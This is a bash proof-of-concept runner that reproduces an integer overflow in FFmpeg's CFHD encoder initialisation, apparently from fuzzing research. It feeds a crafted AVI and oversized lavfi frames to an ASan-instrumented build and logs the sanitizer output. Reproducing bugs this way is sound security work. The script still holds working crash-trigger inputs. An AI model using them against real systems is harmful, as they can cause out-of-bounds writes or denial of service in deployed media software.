#!/bin/bash
# PoC runner for VULN 001: cfhd_encode_init() integer overflow in dwt_buf allocation
# Triggers: ffmpeg -i malicious.avi -c:v cfhd output.cfhd
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg
RESULT_FILE="$SCRIPT_DIR/vuln_001_result.txt"

echo "=== VULN 001 PoC: cfhd_encode_init() integer overflow ===" | tee "$RESULT_FILE"
echo "Date: $(date)" | tee -a "$RESULT_FILE"
echo "" | tee -a "$RESULT_FILE"

# Step 1: Generate malformed AVI
echo "[*] Generating malformed AVI..." | tee -a "$RESULT_FILE"
python3 "$SCRIPT_DIR/vuln_001_gen.py" 2>&1 | tee -a "$RESULT_FILE"
echo "" | tee -a "$RESULT_FILE"

# Step 2: Attempt 1 - crafted AVI file with declared W=65536 H=32768
# cfhd_encode_init() will be called with those dimensions before any decoding.
# The integer overflow underallocates dwt_buf.
# Note: frame decode will fail (only 12 bytes of data), so encode_frame may not run.
echo "[*] Attempt 1: crafted AVI -> CFHD" | tee -a "$RESULT_FILE"
rm -f asan_001a.log.*
ASAN_OPTIONS="abort_on_error=0:log_path=$SCRIPT_DIR/asan_001a.log:detect_leaks=0" \
    "$BIN" -loglevel debug -i "$SCRIPT_DIR/vuln_001_input.avi" \
    -c:v cfhd -f null - >> "$RESULT_FILE" 2>&1 || true
echo "[attempt 1 exit: $?]" >> "$RESULT_FILE" 2>&1 || true
if ls "$SCRIPT_DIR"/asan_001a.log.* 2>/dev/null | head -1 | grep -q .; then
    echo "=== ASAN output (attempt 1) ===" | tee -a "$RESULT_FILE"
    cat "$SCRIPT_DIR"/asan_001a.log.* | tee -a "$RESULT_FILE"
fi
echo "" | tee -a "$RESULT_FILE"

# Step 3: Attempt 2 - lavfi source scaled to overflow-triggering dimensions (W=H=65536)
# Uses a tiny valid input (16x16) scaled up to 65536x65536 via -vf scale.
# This produces an actual frame → cfhd_encode_frame() OOB write.
# WARNING: This requires ~12GB RAM for the frame buffer; may OOM on smaller systems.
echo "[*] Attempt 2: lavfi (16x16) scaled to 65536x65536 -> CFHD (may OOM on small systems)" | tee -a "$RESULT_FILE"
rm -f asan_001b.log.*
ASAN_OPTIONS="abort_on_error=0:log_path=$SCRIPT_DIR/asan_001b.log:detect_leaks=0" \
    "$BIN" -loglevel warning \
    -f lavfi -i "color=c=black:size=16x16:rate=1" \
    -vf "scale=65536:65536" \
    -vframes 1 \
    -c:v cfhd -f null - >> "$RESULT_FILE" 2>&1 || true
echo "[attempt 2 exit: $?]" >> "$RESULT_FILE" 2>&1 || true
if ls "$SCRIPT_DIR"/asan_001b.log.* 2>/dev/null | head -1 | grep -q .; then
    echo "=== ASAN output (attempt 2) ===" | tee -a "$RESULT_FILE"
    cat "$SCRIPT_DIR"/asan_001b.log.* | tee -a "$RESULT_FILE"
fi
echo "" | tee -a "$RESULT_FILE"

# Step 4: Attempt 3 - lavfi source at overflow-triggering dimensions directly (W=H=65536)
echo "[*] Attempt 3: lavfi color at 65536x65536 directly -> CFHD" | tee -a "$RESULT_FILE"
rm -f asan_001c.log.*
ASAN_OPTIONS="abort_on_error=0:log_path=$SCRIPT_DIR/asan_001c.log:detect_leaks=0" \
    "$BIN" -loglevel warning \
    -f lavfi -i "color=c=black:size=65536x65536:rate=1" \
    -vframes 1 \
    -c:v cfhd -f null - >> "$RESULT_FILE" 2>&1 || true
echo "[attempt 3 exit: $?]" >> "$RESULT_FILE" 2>&1 || true
if ls "$SCRIPT_DIR"/asan_001c.log.* 2>/dev/null | head -1 | grep -q .; then
    echo "=== ASAN output (attempt 3) ===" | tee -a "$RESULT_FILE"
    cat "$SCRIPT_DIR"/asan_001c.log.* | tee -a "$RESULT_FILE"
fi
echo "" | tee -a "$RESULT_FILE"

# Step 5: Check if UBSan (undefined behavior sanitizer) is also active
# UBSan would catch the signed integer overflow itself during cfhd_encode_init()
echo "[*] Checking for UBSan/ASan build..." | tee -a "$RESULT_FILE"
if strings "$BIN" 2>/dev/null | grep -q 'ubsan\|__ubsan\|signed-integer-overflow' 2>/dev/null; then
    echo "UBSan detected in binary" | tee -a "$RESULT_FILE"
else
    echo "No UBSan markers found (ASan-only build likely)" | tee -a "$RESULT_FILE"
fi
echo "" | tee -a "$RESULT_FILE"

echo "[*] Done. Check vuln_001_result.txt for output." | tee -a "$RESULT_FILE"
